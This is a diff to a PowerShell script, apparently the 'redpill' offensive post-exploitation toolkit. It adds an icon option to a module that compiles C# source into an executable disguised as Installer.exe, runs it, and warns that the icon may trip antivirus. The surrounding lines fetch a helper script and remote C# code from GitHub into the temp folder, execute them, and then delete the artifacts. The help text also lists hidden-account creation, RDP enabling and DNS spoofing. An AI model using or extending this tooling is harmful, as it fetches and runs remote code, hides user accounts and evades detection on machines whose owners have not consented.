@@ -97,6 +97,7 @@
    [string]$EnableRDP="false",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
+   [string]$IconSet="False",
    [string]$Sponsor="false"
 )
 
@@ -2383,9 +2384,18 @@ If($CsOnTheFly -ne "false"){
    .Parameter OutFile
       Standalone executable name plus is absoluct \ relative path
 
+   .Parameter IconSet
+      Accepts arguments: True or False (default: False)
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute
       Create demo script.cs \ compile it to binary.exe and execute him!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute -IconSet True
+      Create demonstration script.cs \ compile it to binary.exe add
+      redpill icon to standalone executable compiled and execute him!
+      Remark: Adding a icon to our executable migth trigger AV detection!
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -CsOnTheFly Compile -Uri "calc.cs" -OutFile "out.exe"
@@ -2407,6 +2417,7 @@ If($CsOnTheFly -ne "false"){
       NETCompiler   : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
       Uri           : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
       OutFile       : C:\Users\pedro\AppData\Local\Temp\Installer.exe
+      Action        : Execute
       ApplIcon?     : False
       Compiled?     : True
 
@@ -2421,7 +2432,7 @@ If($CsOnTheFly -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CsOnTheFly.ps1 -Destination $Env:TMP\CsOnTheFly.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\CsOnTheFly.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 13){## Corrupted download detected => DefaultFileSize: 13,70703125/KB
+      If($SizeDump -lt 13){## Corrupted download detected => DefaultFileSize: 13,857421875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\CsOnTheFly.ps1"){Remove-Item -Path "$Env:TMP\CsOnTheFly.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2429,7 +2440,7 @@ If($CsOnTheFly -ne "false"){
    }
 
    ## Run auxiliary module
-   powershell -File "$Env:TMP\CsOnTheFly.ps1" -Action $CsOnTheFly -Uri "$Uri" -OutFile "$OutFile"   
+   powershell -File "$Env:TMP\CsOnTheFly.ps1" -Action $CsOnTheFly -Uri "$Uri" -OutFile "$OutFile" -IconSet "$IconSet"
 
    ## Clean Artifacts left behind
    If(Test-Path -Path "$Env:TMP\CsOnTheFly.ps1"){Remove-Item -Path "$Env:TMP\CsOnTheFly.ps1" -Force}
@@ -3782,7 +3793,8 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Query \ Create \ Delete Hidden User Accounts 
+      Author: @r00t-3xp10it
+      Helper - Query \ Create \ Delete Hidden User Accounts 
 
    .DESCRIPTION
       This CmdLet Querys, Creates or Deletes windows hidden accounts.
@@ -3877,9 +3889,18 @@ $HelpParameters = @"
    .Parameter OutFile
       Standalone executable name plus is absoluct \ relative path
 
+   .Parameter IconSet
+      Accepts arguments: True or False (default: False)
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute
       Create demo script.cs \ compile it to binary.exe and execute him!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute -IconSet True
+      Create demonstration script.cs \ compile it to binary.exe add
+      redpill icon to standalone executable compiled and execute him!
+      Remark: Adding a icon to our executable migth trigger AV detection!
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -CsOnTheFly Compile -Uri "calc.cs" -OutFile "out.exe"
@@ -3901,6 +3922,7 @@ $HelpParameters = @"
       NETCompiler   : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
       Uri           : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
       OutFile       : C:\Users\pedro\AppData\Local\Temp\Installer.exe
+      Action        : Execute
       ApplIcon?     : False
       Compiled?     : True
 
